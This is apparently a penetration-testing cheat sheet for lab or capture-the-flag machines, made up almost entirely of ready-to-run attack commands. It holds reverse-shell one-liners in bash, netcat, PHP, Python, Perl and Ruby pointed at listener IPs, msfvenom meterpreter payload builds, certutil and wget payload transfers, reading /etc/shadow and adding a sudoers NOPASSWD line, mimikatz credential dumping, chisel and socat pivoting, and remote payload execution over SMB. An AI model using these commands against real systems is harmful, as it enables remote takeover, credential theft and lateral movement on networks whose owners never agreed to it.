

```



   (  (     what up 
   )  )     hackers 
  .......   enjoy  
  |     |]  the
  \     /   raw
   `---'    turkishcoffee

www.iamturkishcoffee.com


💫💫💫 IMPROVE THE SHELL 💫💫💫

python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'

CTRL Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
stty rows 44 cols 184

💫💫💫 REVERSE SHELLS ONE-LINERS 💫💫💫

rlwrap nc -nlvp 8200

bash -i >& /dev/tcp/10.10.10.13/8200 &

/bin/bash -i >& /dev/tcp/10.10.14.13/8281 & 

nc -e /bin/sh 10.10.14.12 8200 &

php -r '$sock=fsockopen("10.10.14.13",8281);exec("/bin/sh -i <&3 >&3 2>&3");'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.13",8200));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.13 8200 > /tmp/f

perl -e 'use Socket;$i="10.10.10.13";$p=8200;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

ruby -rsocket -e'f=TCPSocket.open("10.10.10.13",8200).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

nc -e /bin/sh 10.10.14.12 8281 &

nc.exe -lvp 8200

nc.exe 192.168.100.13 8200 -e cmd.exe
nc.exe -nv 192.168.100.13 8200 -e cmd.exe

💫💫💫 REV SHELL SCRIPTS 💫💫💫

echo '#!/bin/bash' > reverse_shell.sh
echo '/bin/bash -i >& /dev/tcp/10.10.10.13/8200 0>&1' >> reverse_shell.sh
chmod +x reverse_shell.sh
./reverse_shell.sh

💫💫💫 METASPLOIT 💫💫💫

# MSFVENOM SHELLS

windows/shell_reverse_tcp 
windows/shell_bind_tcp

windows/meterpreter/reverse_http 
windows/meterpreter/bind_tcp
windows/meterpreter/reverse_tcp

# MSFVENOM

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.13 LPORT=7272 -f
exe > meterpreter.exe

# MULTI HANDLER

use exploit/multi/handler
*payload should match the rev shell s one
set payload linux/x86/shell/reverse_tcp

run -j -z 
jobs
sessions

💫💫💫 CRACKING HASHES 💫💫💫

https://hashcat.net/wiki/doku.php?id=example_hashes

hashcat -m 500 -a 0 hashes_md5 /home/kali/rockyou.txt

💫💫💫 TRANSERRING STUFF 💫💫💫

# WGET 

python -m SimpleHTTPServer 8200
python3 -m http.server 8200

wget http://192.168.111.13:8200/havefun.txt
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://192.168.100.13:8200/folder

# CERTUTIL

python -m SimpleHTTPServer 8200
python3 -m http.server 8200

certutil -urlcache -split -f http://192.168.100.13:8200/havefun.txt havefun.txt

# SMBSERVER 

smbserver.py smbFolder $(pwd) -smb2support

File Explorer

\\192.168.111.13\smbFolder

CLI

net use C: \\192.168.111.13\smbFolder

# NC

nc -nlvp receiving_port > file.exe
nc receiving_box receiving_port < file.exe

nc.exe 192.168.100.13 8200 < file.exe
nc -nlvp 8200 > file.exe

nc -nlvp PORT
nc KALI_IP KALI_PORT -e /bin/bash

💫💫💫 PRIVESC LINUX 💫💫💫

enum4linux -a 10.10.10.3

./linpeas.sh -a output.txt
./linpeas.sh >> output 

./lse.sh -l 0/1/2
./linux-exploit-suggester.sh

sudo su
su
cat /etc/shadow
sudo -l
cat /etc/passwd
history
cat .bash_history
cat .bashrc
cat .profile
cat /root/.bash_history
ls -la .ssh

ls -l /etc/sudoers
turkishcoffee ALL=(ALL) NOPASSWD: ALL
sudo su

top
ps aux

cat /etc/crontab

uname -a

find / -type f \( -perm -4000 -o -perm -2000 \) -print 2>/dev/null

💫💫💫 PRIVESC WINDOWS 💫💫💫

# MIMIKATZ

mimikatz.exe

log
version
privilege::debug

token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
crypto::hash
sekurlsa::logonPasswords full

# WINDOWS EXPLOIT SUGGESTER

systeminfo
./windows-exploit-suggester.py --update
python2 windows-exploit-suggester.py -d 2023-11-20-mssb.xls -i windows_sysinfo_localbox

💫💫💫 PIVOTING 💫💫💫

./chisel_1.5.0_linux_386 server --reverse -p 1234

chisel_1.5.0_windows_amd64 client 192.168.111.13:1234 R:socks &

./chisel_1.5.0_linux_386 client 192.168.111.13:1234 R:socks &

nc -nlvp 

./socat TCP-LISTEN:2727,fork TCP:172.16.40.6:8200 &

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.111.13

# METASPLOIT: GET THE NEW SUBNET

run autoroute -s 192.168.100.0/24
run autoroute -p 

# METASPLOIT: MAKE THE NEW SUBN AVAILABLE SYSTEM WIDE

use auxiliary/server/socks_proxy
set srvhost 127.0.0.1 
(or we can put our kali ip should be working)
run

💫💫💫 80,443 💫💫💫

dirb http://10.10.10.13

dirb http://192.168.100.13/ -X .php,.sh,.conf,.log,.txt,.html,.js,.json,.yml,.htaccess /usr/share/wordlists/dirb/common.txt -o dirb -S

gobuster dir -u http://10.10.10.95:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x .php

💫💫💫 21 💫💫💫 

ls
put
get
bin
ascii
bye

💫💫💫 139,445 💫💫💫 

smbclient \\\\10.10.10.13\\
help

cme smb 10.10.10.13 -u 'admin' -p 'pass' --put-file /home/kali/meterpreter_34.exe \\Users\\admin\\meterepreter_34.exe

cme smb 10.10.10.13 -u 'admin' -p 'pass' -X \\Users\\share\\meterepreter_34.exe

cme smb 10.10.10.13 -u 'admin' -p 'pass' -M rdp -o ACTION=enable

💫💫💫 NMAP 💫💫💫

nmap -sCV --script vuln 10.10.10.13 -o nmap_scv_vuln_13

nmap -p- -sCV 10.10.10.13 -o alltcp_scv_box13

nmap -p- -sU -sCV -T4 10.10.10.13 -o alludp_scv_box13
OR
nmap -p- -sU -sCV -T4 --max-retries 1 10.10.10.13 -o alludp_scv_box13  

nmap --script=vuln 

nmap -p- -sCV --open 10.10.10.13

💫💫💫 PROXYCHAINS 💫💫💫

/etc/proxychains4.conf
strict chain
socks5 127.0.0.1 1080

proxychains nmap -sT -Pn -sCV 10.10.10.13 -v -n 2>/dev/null


```